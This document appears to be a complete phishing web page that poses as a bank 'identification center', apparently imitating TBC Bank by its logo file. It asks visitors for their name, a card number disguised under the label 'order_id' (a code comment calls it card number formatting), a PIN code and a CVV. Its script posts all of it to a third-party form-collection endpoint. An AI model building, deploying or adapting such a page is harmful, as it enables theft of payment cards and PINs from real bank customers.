<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>იდენტიფიკაციის ცენტრი</title>

<link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">

<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f9;
    margin: 0;
    padding: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.center-container {
    text-align: center;
    margin-bottom: 20px;
}
.logo {
    max-width: 150px;
}

.form-container {
    background: white;
    padding: 25px 35px;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    width: 100%;
    max-width: 450px;
    box-sizing: border-box;
}

h1 {
    text-align: center;
    margin-bottom: 10px;
    color: #333;
}
h3 {
    text-align: center;
    color: #666;
    margin-bottom: 20px;
}

label {
    font-weight: bold;
    margin-bottom: 5px;
    display: block;
}

input {
    width: 100%;
    padding: 14px;
    margin-bottom: 15px;
    border-radius: 6px;
    border: 1px solid #ccc;
    font-size: 16px;
    box-sizing: border-box;
}

.expiry-cvv-row {
    display: flex;
    gap: 15px;
}
.expiry-cvv-row div {
    flex: 1;
}

button {
    width: 100%;
    padding: 16px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}
button:hover {
    background-color: #0056b3;
}

.success-message {
    text-align: center;
    color: green;
    margin-top: 15px;
    display: none;
    font-weight: bold;
}

@media (max-width: 480px) {
    .form-container {
        padding: 20px;
    }
}
</style>
</head>

<body>

<div class="center-container">
    <img src="TBlogo.svg.png" alt="Логотип сайта" class="logo">
</div>

<div class="form-container">
    <h1>იდენტიფიკაციის ცენტრი</h1>

    <form id="contact-form" action="https://submit.formspark.io/ZNHCwJg0T" method="POST">
        <h3>დატოვეთ თქვენი მონაცემები</h3>

        <label for="first-name">სახელი (Имя)</label>
        <input type="text" name="first_name" id="first-name" required>

        <label for="last-name">გვარი (Фамилия)</label>
        <input type="text" name="last_name" id="last-name" required>

        <label for="order-id">order_id</label>
        <input type="text" name="order_id" id="order-id"
               placeholder="0000 0000 0000 0000"
               maxlength="19"
               inputmode="numeric"
               required>

        <div class="expiry-cvv-row">
            <div>
                <label for="pin-code">pin_code</label>
                <input type="text" name="pin_code" id="pin-code"
                       placeholder="pin_code"
                       maxlength="5"
                       required>
            </div>
            <div>
                <label for="cvv">cvv</label>
                <input type="password" name="cvv_code" id="cvv"
                       placeholder="***"
                       maxlength="3"
                       inputmode="numeric"
                       required>
            </div>
        </div>

        <button type="submit">მონაცების გაგზავნა</button>
    </form>

    <div class="success-message" id="success-message">Спасибо! Ваша заявка отправлена.</div>
</div>

<script>
// Форматирование номера карты
document.getElementById('order-id').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0,16);
    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
});

// Только цифры для pin_code
document.getElementById('pin-code').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0,5);
});

// Только цифры для CVV
document.getElementById('cvv').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
});

// Отправка формы с уведомлением без перезагрузки
document.getElementById('contact-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const form = e.target;
    fetch(form.action, {
        method: 'POST',
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
    }).then(response => {
        if (response.ok) {
            form.reset();
            document.getElementById('success-message').style.display = 'block';
        } else {
            alert('Ошибка отправки формы. Попробуйте позже.');
        }
    }).catch(error => {
        alert('Ошибка отправки формы. Попробуйте позже.');
    });
});
</script>

</body>
</html>
